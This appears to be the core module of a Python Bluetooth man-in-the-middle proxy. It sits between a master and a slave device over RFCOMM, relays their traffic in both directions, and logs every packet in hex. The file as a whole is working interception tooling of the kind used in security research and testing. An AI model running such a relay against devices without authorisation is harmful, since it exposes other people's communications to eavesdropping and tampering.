# MIT License - Copyright (c) 2025 Robert Cole

import threading
import socket
from btpie.logger import setup_logger
from btpie.adapter import BluetoothAdapter

class MITMCore:
    def __init__(self, master_mac, slave_mac, log_file="logs/session.log", port=1, verbose=False):
        self.master_mac = master_mac
        self.slave_mac = slave_mac
        self.log_file = log_file
        self.port = port
        self.verbose = verbose
        self.logger = setup_logger(self.log_file)
        self.adapter = BluetoothAdapter(master_mac, slave_mac, port=self.port)
        self.stop_event = threading.Event()

    def start(self):
        try:
            self.adapter.start_server()

            while not self.stop_event.is_set():
                self.logger.info(f"[*] Waiting for master on port {self.port}...")
                self.adapter.wait_for_master()

                if not self.adapter.connect_to_slave():
                    self.logger.error("[!] Failed to connect to slave")
                    break

                self.adapter.conn_sock.settimeout(5.0)
                self.adapter.client_sock.settimeout(5.0)

                t1 = threading.Thread(target=self.relay, args=(self.adapter.conn_sock, self.adapter.client_sock, "Master → Slave"))
                t2 = threading.Thread(target=self.relay, args=(self.adapter.client_sock, self.adapter.conn_sock, "Slave → Master"))
                t1.start()
                t2.start()
                t1.join()
                t2.join()

                self.logger.warning("[!] Connection lost, restarting listener")
                self.adapter.close()

                self.stop_event.clear()

        except Exception as e:
            self.logger.error(f"[!] Unexpected error in MITM core: {e}")

        self.cleanup()

    def relay(self, source_sock, dest_sock, direction):
        try:
            while not self.stop_event.is_set():
                try:
                    data = source_sock.recv(1024)
                    if not data:
                        break
                    hex_data = data.hex()
                    if self.verbose:
                        print(f"[{direction}] {hex_data}")
                    self.logger.info(f"[{direction}] {hex_data}")
                    dest_sock.send(data)
                except socket.timeout:
                    continue
        except Exception as e:
            self.logger.error(f"[!] Relay error {direction}: {e}")

    def cleanup(self):
        self.logger.info("[*] Cleaning up sockets")
        self.adapter.close()
        self.stop_event.set()

def main():
    import argparse

    parser = argparse.ArgumentParser(description="Bluetooth MITM Proxy")
    parser.add_argument("--master", required=True, help="MAC address of master device")
    parser.add_argument("--slave", required=True, help="MAC address of slave device")
    parser.add_argument("--log", default="logs/session.log", help="Log file path")
    parser.add_argument("--port", type=int, default=1, help="RFCOMM port")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose hex output")
    args = parser.parse_args()

    mitm = MITMCore(args.master, args.slave, log_file=args.log, port=args.port, verbose=args.verbose)
    mitm.start()
